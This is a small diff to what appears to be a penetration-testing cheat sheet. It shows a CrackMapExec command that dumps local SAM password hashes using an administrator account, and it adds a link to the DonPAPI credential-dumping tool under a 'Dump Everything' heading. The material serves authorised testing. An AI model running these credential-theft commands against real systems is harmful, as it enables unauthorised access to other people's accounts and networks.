@@ -84,6 +84,8 @@ CrackMapExec : Dump local SAM hashes using local admin account
 ```markdown
 crackmapexec smb IP_ADDRESS -u 'Administrator' -p 'PASS' --local-auth --sam
 ```
+### Dump Everything
+https://github.com/login-securite/DonPAPI
 
 ### PowerShell one-liners
 
